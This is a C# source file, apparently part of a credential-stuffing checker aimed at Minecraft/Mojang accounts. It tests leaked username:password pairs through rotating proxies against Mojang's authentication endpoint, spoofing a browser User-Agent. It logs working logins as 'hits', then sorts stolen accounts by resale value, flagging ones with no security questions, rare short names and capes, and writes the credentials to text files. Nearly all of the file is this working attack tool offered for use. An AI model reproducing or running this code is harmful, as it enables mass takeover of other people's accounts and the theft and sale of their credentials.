using RestSharp;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Newtonsoft.Json;
using System.Web.Services;
using System.Web;

namespace CheckerV1
{
    class Request
    {

        public static ProxyHandler proxyHandler = new ProxyHandler(Loading.proxyHandlerList);
        public static int Hits, Checked, CPM, CPMTimer;

        public static void Start(string Combo)
        {
            Proxies proxiesAddress = proxyHandler.NewProxy();

            MakeRequest(Combo, proxiesAddress);
        }
        private static void MakeRequest(string Combo, Proxies proxy)
        {
            CPMTimer++;

            string Username = string.Empty;
            string Password = string.Empty;

            if (Combo.Contains(":"))
            {
                Username = Combo.Split(new string[] { ":" }, StringSplitOptions.None)[0];
                Password = Combo.Split(new string[] { ":" }, StringSplitOptions.None)[1];
            }
            else if (!Combo.Contains(":")) { return; }


            string postData = "{\"agent\":{\"name\":\"Minecraft\",\"version\":1},\"username\":\"" + Username + "\",\"password\":\"" + Password + "\",\"clientToken\":\"clientidentifier\",\"requestUser\":true}";

            try
            {
                var client = new RestClient("https://authserver.mojang.com/authenticate");
                client.Proxy = new WebProxy(proxy.Proxy);

                var request = new RestRequest(Method.POST);


                request.AddHeader("Content-Type", "application/json");
                request.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                request.AddHeader("Pragma", "no-cache");
                request.AddHeader("Accept", "*/*");
                request.AddParameter("text/xml", postData, ParameterType.RequestBody);

                IRestResponse response = client.Execute(request);
                var content = response.Content;


                string[] responseKeys = new string[] {
                "accessToken\":\"",
                "passwordChangedAt\":",
                "paid\":true",
                "availableProfiles\":[],",
                "Invalid username or password",
                "The request could not be satisfied"};

                //If this doesn't work, poordev. Try this.
                //var accessToken = (string)null;
                //string accessToken = null;


                var accessToken = (string)null;
                var uuid = (string)null;
                var capturedUsername = (string)null;

                string _responseKey = responseKeys.FirstOrDefault<string>(s => content.Contains(s));
                switch (_responseKey)
                {
                    case "accessToken\":\"":

                        Checked++;
                        Hits++;

                        var jsonData = JsonConvert.DeserializeObject<dynamic>(content);
                        capturedUsername = jsonData.selectedProfile.name;
                        accessToken = jsonData.accessToken;
                        uuid = jsonData.selectedProfile.id;

                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("-> [HIT] - [NFA] {0} | Name: {1}", Combo, capturedUsername);
                        Console.ResetColor();

                        proxy.FinishedUsingProxy();

                        CheckerV1.Saving.Save(Combo, capturedUsername, 1, "");

                        break;

                    case "passwordChangedAt\":":



                        break;

                    case "paid\":true":



                        break;

                    case "avaliableProfiles\":[],":



                        break;

                    case "Invalid username or password":

                        Checked++;

                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("-> [FAILED] {0}", Combo);
                        Console.ResetColor();

                        proxy.FinishedUsingProxy();


                        break;

                    case "The request could not be satisfied":

                        Checked++;

                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("-> [RETRY] {0}", Combo);
                        Console.ResetColor();

                        proxy.FinishedUsingProxy();
                        Start(Combo);

                        break;

                    default:

                        proxy.FinishedUsingProxy();


                        break;

                }

                if (content.Contains("selectedProfile"))
                {
                    if (capturedUsername.Length <= 3)
                    {
                        using (FileStream namee = new FileStream("ogname.txt", FileMode.Append, FileAccess.Write, FileShare.None))
                        {
                            using (StreamWriter writer = new StreamWriter(namee))
                            {
                                writer.WriteLine($"OG Name || {Combo} + {capturedUsername}");

                                namee.Flush();
                            }

                        }

                    }
                    else
                    {

                    }
                }
                else
                {

                }

                var clientone = new RestClient("https://api.mojang.com/user/security/challenges");
                clientone.Proxy = new WebProxy(proxy.Proxy);

                var requestone = new RestRequest(Method.GET);

                requestone.AddHeader("Authorization", $"Bearer {accessToken}");
                requestone.AddHeader("Content-Type", "application/json");
                requestone.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                requestone.AddHeader("Pragma", "no-cache");
                requestone.AddHeader("Accept", "*/*");

                IRestResponse responseone = clientone.Execute(requestone);
                var contentone = responseone.Content;


                if (contentone.Contains("{}"))
                {

                }
                else
                {
                    try
                    {
                        if (contentone == "[]")
                        {
                            using (FileStream unsecured = new FileStream("Unsecuredd.txt", FileMode.Append, FileAccess.Write, FileShare.None))
                            {
                                using (StreamWriter writer = new StreamWriter(unsecured))
                                {
                                    writer.WriteLine($"SFA || {Combo}");

                                    unsecured.Flush();
                                }

                            }

                        }

                        else if (contentone == "False")
                        {
                            using (FileStream unsecuredtxt = new FileStream("Unsecureddd.txt", FileMode.Append, FileAccess.Write, FileShare.None))
                            {
                                using (StreamWriter writer = new StreamWriter(unsecuredtxt))
                                {
                                    writer.WriteLine($"SFA || {Combo}");

                                    unsecuredtxt.Flush();
                                }

                            }
                        }
                        else
                        {

                        }
                    }
                    catch (Exception)
                    {

                    }

                }
                //If this doesn't work, well ima do mojang capture

                if (content.Contains("selectedProfile"))
                {
                    var clienttwo = new RestClient($"http://s.optifine.net/capes/{capturedUsername}.png");
                    clienttwo.Proxy = new WebProxy(proxy.Proxy);

                    var requesttwo = new RestRequest(Method.GET);

                    requesttwo.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                    requesttwo.AddHeader("Pragma", "no-cache");
                    requesttwo.AddHeader("Accept", "*/*");
                    requesttwo.AddHeader("Content-Type", "text/html; image/png");

                    IRestResponse responsetwo = clienttwo.Execute(requesttwo);
                    var contenttwo = responsetwo.Content;

                    try
                    {
                        if (!contenttwo.Contains("Not found"))
                        {
                            using (FileStream optiifineelse = new FileStream("optifineelse.txt", FileMode.Append, FileAccess.Write, FileShare.None))
                            {
                                using (StreamWriter writer = new StreamWriter(optiifineelse))
                                {
                                    writer.WriteLine($"Optifine || {Combo} : {capturedUsername}");

                                    optiifineelse.Flush();
                                }

                            }
                        }
                        else
                        {


                        }
                    }
                    catch (Exception)
                    {

                    }
                }
                else
                {

                }

                if (content.Contains("selectedProfile"))
                {
                    var clientthree = new RestClient($"https://api.ashcon.app/mojang/v2/user/{uuid}");
                    clientthree.Proxy = new WebProxy(proxy.Proxy);

                    var requestthree = new RestRequest(Method.GET);

                    requestthree.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                    requestthree.AddHeader("Pragma", "no-cache");
                    requestthree.AddHeader("Accept", "*/*");

                    IRestResponse responsethree = clientthree.Execute(requestthree);
                    var contentthree = responsethree.Content;

                    try
                    {
                        if (contentthree.Contains("cape"))
                        {
                            using (FileStream minecon = new FileStream("Minecon.txt", FileMode.Append, FileAccess.Write, FileShare.None))
                            {
                                using (StreamWriter writer = new StreamWriter(minecon))
                                {
                                    writer.WriteLine($"Minecon || {Combo}");

                                    minecon.Flush();
                                }

                            }
                        }
                        else
                        {

                        }
                    }
                    catch (Exception)
                    {

                    }
                }
                else
                {

                }
            }

            catch (WebException e)
            {
                proxy.FinishedUsingProxy();
                Start(Combo);

            }

        }

    }
}